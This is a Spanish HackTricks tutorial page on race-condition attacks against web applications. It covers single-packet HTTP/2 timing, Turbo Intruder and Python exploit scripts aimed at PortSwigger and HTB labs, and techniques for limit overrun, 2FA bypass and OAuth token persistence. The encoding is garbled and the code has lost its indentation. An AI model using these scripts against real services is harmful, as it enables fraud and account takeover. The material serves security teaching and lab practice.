# Condici√≥n de Carrera

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) para construir y **automatizar flujos de trabajo** f√°cilmente impulsados por las **herramientas comunitarias m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}

{% hint style="warning" %}
Para obtener una comprensi√≥n profunda de esta t√©cnica, consulta el informe original en [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Mejorando los Ataques de Condici√≥n de Carrera

El principal obst√°culo para aprovechar las condiciones de carrera es asegurarse de que m√∫ltiples solicitudes se manejen al mismo tiempo, con **muy poca diferencia en sus tiempos de procesamiento‚Äîidealmente, menos de 1ms**.

Aqu√≠ puedes encontrar algunas t√©cnicas para Sincronizar Solicitudes:

#### Ataque de Paquete √önico HTTP/2 vs. Sincronizaci√≥n del √öltimo Byte HTTP/1.1

* **HTTP/2**: Soporta el env√≠o de dos solicitudes a trav√©s de una sola conexi√≥n TCP, reduciendo el impacto del jitter de la red. Sin embargo, debido a las variaciones del lado del servidor, dos solicitudes pueden no ser suficientes para un exploit de condici√≥n de carrera consistente.
* **Sincronizaci√≥n del '√öltimo Byte' HTTP/1.1**: Permite el pre-env√≠o de la mayor√≠a de las partes de 20-30 solicitudes, reteniendo un peque√±o fragmento, que luego se env√≠a junto, logrando una llegada simult√°nea al servidor.

**La preparaci√≥n para la Sincronizaci√≥n del √öltimo Byte** implica:

1. Enviar encabezados y datos del cuerpo menos el byte final sin finalizar el flujo.
2. Pausar durante 100ms despu√©s del env√≠o inicial.
3. Desactivar TCP\_NODELAY para utilizar el algoritmo de Nagle para agrupar los cuadros finales.
4. Hacer ping para calentar la conexi√≥n.

El env√≠o posterior de los cuadros retenidos deber√≠a resultar en su llegada en un solo paquete, verificable a trav√©s de Wireshark. Este m√©todo no se aplica a archivos est√°ticos, que no suelen estar involucrados en ataques de RC.

### Adapt√°ndose a la Arquitectura del Servidor

Entender la arquitectura del objetivo es crucial. Los servidores front-end pueden enrutar las solicitudes de manera diferente, afectando el tiempo. El calentamiento proactivo de la conexi√≥n del lado del servidor, a trav√©s de solicitudes insignificantes, podr√≠a normalizar el tiempo de las solicitudes.

#### Manejo del Bloqueo Basado en Sesiones

Frameworks como el manejador de sesiones de PHP serializan las solicitudes por sesi√≥n, potencialmente oscureciendo vulnerabilidades. Utilizar diferentes tokens de sesi√≥n para cada solicitud puede eludir este problema.

#### Superando L√≠mites de Tasa o Recursos

Si el calentamiento de la conexi√≥n no es efectivo, provocar intencionalmente retrasos en los l√≠mites de tasa o recursos de los servidores web a trav√©s de una inundaci√≥n de solicitudes ficticias podr√≠a facilitar el ataque de paquete √∫nico al inducir un retraso del lado del servidor propicio para las condiciones de carrera.

## Ejemplos de Ataque

* **Tubo Intruder - ataque de paquete √∫nico HTTP2 (1 endpoint)**: Puedes enviar la solicitud a **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), puedes cambiar en la solicitud el valor que deseas forzar para **`%s`** como en `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` y luego seleccionar el **`examples/race-single-packer-attack.py`** del men√∫ desplegable:

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

Si vas a **enviar diferentes valores**, podr√≠as modificar el c√≥digo con este que utiliza una lista de palabras del portapapeles:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Si la web no soporta HTTP2 (solo HTTP1.1) usa `Engine.THREADED` o `Engine.BURP` en lugar de `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - ataque de paquete √∫nico HTTP2 (Varios puntos finales)**: En caso de que necesites enviar una solicitud a 1 punto final y luego m√∫ltiples a otros puntos finales para activar el RCE, puedes cambiar el script `race-single-packet-attack.py` por algo como:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Tambi√©n est√° disponible en **Repeater** a trav√©s de la nueva opci√≥n '**Enviar grupo en paralelo**' en Burp Suite.
* Para **limit-overrun** podr√≠as simplemente agregar la **misma solicitud 50 veces** en el grupo.
* Para **connection warming**, podr√≠as **agregar** al **principio** del **grupo** algunas **solicitudes** a alguna parte no est√°tica del servidor web.
* Para **delaying** el proceso **entre** el procesamiento **de una solicitud y otra** en 2 pasos de subestado, podr√≠as **agregar solicitudes extra entre** ambas solicitudes.
* Para un **multi-endpoint** RC podr√≠as comenzar enviando la **solicitud** que **va al estado oculto** y luego **50 solicitudes** justo despu√©s que **explotan el estado oculto**.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **Script de python automatizado**: El objetivo de este script es cambiar el correo electr√≥nico de un usuario mientras se verifica continuamente hasta que el token de verificaci√≥n del nuevo correo llegue al √∫ltimo correo (esto se debe a que en el c√≥digo se estaba viendo un RC donde era posible modificar un correo electr√≥nico pero tener la verificaci√≥n enviada al antiguo porque la variable que indicaba el correo ya estaba poblada con el primero).\
Cuando se encuentra la palabra "objetivo" en los correos electr√≥nicos recibidos, sabemos que hemos recibido el token de verificaci√≥n del correo cambiado y terminamos el ataque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Mejora del Ataque de Paquete √önico

En la investigaci√≥n original se explica que este ataque tiene un l√≠mite de 1,500 bytes. Sin embargo, en [**esta publicaci√≥n**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), se explic√≥ c√≥mo es posible extender la limitaci√≥n de 1,500 bytes del ataque de paquete √∫nico a la **limitaci√≥n de ventana de 65,535 B de TCP utilizando la fragmentaci√≥n de capa IP** (dividiendo un solo paquete en m√∫ltiples paquetes IP) y envi√°ndolos en un orden diferente, lo que permiti√≥ evitar la reensambladura del paquete hasta que todos los fragmentos llegaran al servidor. Esta t√©cnica permiti√≥ al investigador enviar 10,000 solicitudes en aproximadamente 166 ms.&#x20;

Tenga en cuenta que, aunque esta mejora hace que el ataque sea m√°s confiable en RC que requiere que cientos/miles de paquetes lleguen al mismo tiempo, tambi√©n puede tener algunas limitaciones de software. Algunos servidores HTTP populares como Apache, Nginx y Go tienen un ajuste estricto de `SETTINGS_MAX_CONCURRENT_STREAMS` a 100, 128 y 250. Sin embargo, otros como NodeJS y nghttp2 lo tienen ilimitado.\
Esto significa b√°sicamente que Apache solo considerar√° 100 conexiones HTTP de una sola conexi√≥n TCP (limitando este ataque RC).

Puede encontrar algunos ejemplos utilizando esta t√©cnica en el repositorio [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## BF Crudo

Antes de la investigaci√≥n anterior, estos eran algunos payloads utilizados que solo intentaban enviar los paquetes lo m√°s r√°pido posible para causar un RC.

* **Repetidor:** Consulte los ejemplos de la secci√≥n anterior.
* **Intruso**: Env√≠e la **solicitud** a **Intruso**, establezca el **n√∫mero de hilos** en **30** dentro del **men√∫ de Opciones** y seleccione como payload **Payloads Nulos** y genere **30.**
* **Turbo Intruso**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodolog√≠a RC**

### Limit-overrun / TOCTOU

Este es el tipo m√°s b√°sico de condici√≥n de carrera donde **vulnerabilidades** que **aparecen** en lugares que **limitan el n√∫mero de veces que puedes realizar una acci√≥n**. Como usar el mismo c√≥digo de descuento en una tienda web varias veces. Un ejemplo muy f√°cil se puede encontrar en [**este informe**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) o en [**este error**](https://hackerone.com/reports/759247)**.**

Hay muchas variaciones de este tipo de ataque, incluyendo:

* Redimir una tarjeta de regalo varias veces
* Calificar un producto varias veces
* Retirar o transferir efectivo en exceso de tu saldo de cuenta
* Reutilizar una √∫nica soluci√≥n CAPTCHA
* Eludir un l√≠mite de tasa anti-fuerza bruta

### **Subestados ocultos**

Explotar condiciones de carrera complejas a menudo implica aprovechar breves oportunidades para interactuar con subestados de m√°quina ocultos o **no intencionados**. Aqu√≠ te mostramos c√≥mo abordar esto:

1. **Identificar Subestados Ocultos Potenciales**
* Comienza por identificar puntos finales que modifican o interact√∫an con datos cr√≠ticos, como perfiles de usuario o procesos de restablecimiento de contrase√±a. Enf√≥cate en:
* **Almacenamiento**: Prefiere puntos finales que manipulan datos persistentes del lado del servidor sobre aquellos que manejan datos del lado del cliente.
* **Acci√≥n**: Busca operaciones que alteren datos existentes, que son m√°s propensas a crear condiciones explotables en comparaci√≥n con aquellas que a√±aden nuevos datos.
* **Claves**: Los ataques exitosos generalmente involucran operaciones basadas en el mismo identificador, por ejemplo, nombre de usuario o token de restablecimiento.
2. **Realizar Sondeos Iniciales**
* Prueba los puntos finales identificados con ataques de condici√≥n de carrera, observando cualquier desviaci√≥n de los resultados esperados. Respuestas inesperadas o cambios en el comportamiento de la aplicaci√≥n pueden se√±alar una vulnerabilidad.
3. **Demostrar la Vulnerabilidad**
* Reduce el ataque al n√∫mero m√≠nimo de solicitudes necesarias para explotar la vulnerabilidad, a menudo solo dos. Este paso puede requerir m√∫ltiples intentos o automatizaci√≥n debido al tiempo preciso involucrado.

### Ataques Sensibles al Tiempo

La precisi√≥n en el tiempo de las solicitudes puede revelar vulnerabilidades, especialmente cuando se utilizan m√©todos predecibles como marcas de tiempo para tokens de seguridad. Por ejemplo, generar tokens de restablecimiento de contrase√±a basados en marcas de tiempo podr√≠a permitir tokens id√©nticos para solicitudes simult√°neas.

**Para Explotar:**

* Usa un tiempo preciso, como un ataque de paquete √∫nico, para hacer solicitudes de restablecimiento de contrase√±a concurrentes. Tokens id√©nticos indican una vulnerabilidad.

**Ejemplo:**

* Solicita dos tokens de restablecimiento de contrase√±a al mismo tiempo y comp√°ralos. Tokens coincidentes sugieren un defecto en la generaci√≥n de tokens.

**Revisa esto** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **para probar esto.**

## Estudios de caso de subestados ocultos

### Pagar y a√±adir un √≠tem

Revisa este [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) para ver c√≥mo **pagar** en una tienda y **a√±adir un extra** que **no necesitar√°s pagar**.

### Confirmar otros correos

La idea es **verificar una direcci√≥n de correo electr√≥nico y cambiarla a una diferente al mismo tiempo** para averiguar si la plataforma verifica la nueva que se cambi√≥.

### Cambiar correo a 2 direcciones de correo basadas en cookies

Seg√∫n [**esta investigaci√≥n**](https://portswigger.net/research/smashing-the-state-machine), Gitlab era vulnerable a una toma de control de esta manera porque podr√≠a **enviar** el **token de verificaci√≥n de correo de un correo al otro correo**.

**Revisa esto** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **para probar esto.**

### Estados ocultos de la base de datos / Bypass de confirmaci√≥n

Si se utilizan **2 escrituras diferentes** para **agregar** **informaci√≥n** dentro de una **base de datos**, hay una peque√±a porci√≥n de tiempo donde **solo los primeros datos han sido escritos** dentro de la base de datos. Por ejemplo, al crear un usuario, el **nombre de usuario** y **contrase√±a** pueden ser **escritos** y **luego el token** para confirmar la cuenta reci√©n creada es escrito. Esto significa que durante un breve tiempo el **token para confirmar una cuenta es nulo**.

Por lo tanto, **registrar una cuenta y enviar varias solicitudes con un token vac√≠o** (`token=` o `token[]=` o cualquier otra variaci√≥n) para confirmar la cuenta de inmediato podr√≠a permitir **confirmar una cuenta** donde no controlas el correo.

**Revisa esto** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **para probar esto.**

### Bypass 2FA

El siguiente pseudo-c√≥digo es vulnerable a condici√≥n de carrera porque en un tiempo muy peque√±o **2FA no se aplica** mientras se crea la sesi√≥n:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### Persistencia eterna de OAuth2

Hay varios [**proveedores de OAUth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Estos servicios te permitir√°n crear una aplicaci√≥n y autenticar a los usuarios que el proveedor ha registrado. Para hacerlo, el **cliente** necesitar√° **permitir que tu aplicaci√≥n** acceda a algunos de sus datos dentro del **proveedor de OAUth**.\
As√≠ que, hasta aqu√≠, solo un inicio de sesi√≥n com√∫n con google/linkedin/github... donde se te presenta una p√°gina que dice: "_La aplicaci√≥n \<InsertCoolName> quiere acceder a tu informaci√≥n, ¬øquieres permitirlo?_"

#### Condici√≥n de carrera en `authorization_code`

El **problema** aparece cuando **lo aceptas** y autom√°ticamente env√≠a un **`authorization_code`** a la aplicaci√≥n maliciosa. Luego, esta **aplicaci√≥n abusa de una Condici√≥n de Carrera en el proveedor de servicios OAUth para generar m√°s de un AT/RT** (_Token de Autenticaci√≥n/Token de Refresco_) a partir del **`authorization_code`** para tu cuenta. B√°sicamente, abusar√° del hecho de que has aceptado la aplicaci√≥n para acceder a tus datos para **crear varias cuentas**. Luego, si **dejas de permitir que la aplicaci√≥n acceda a tus datos, un par de AT/RT ser√° eliminado, pero los otros seguir√°n siendo v√°lidos**.

#### Condici√≥n de carrera en `Refresh Token`

Una vez que has **obtenido un RT v√°lido**, podr√≠as intentar **abusar de √©l para generar varios AT/RT** y **incluso si el usuario cancela los permisos** para que la aplicaci√≥n maliciosa acceda a sus datos, **varios RT seguir√°n siendo v√°lidos.**

## **RC en WebSockets**

En [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) puedes encontrar un PoC en Java para enviar mensajes de websocket en **paralelo** para abusar de **Condiciones de Carrera tambi√©n en Web Sockets**.

## Referencias

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
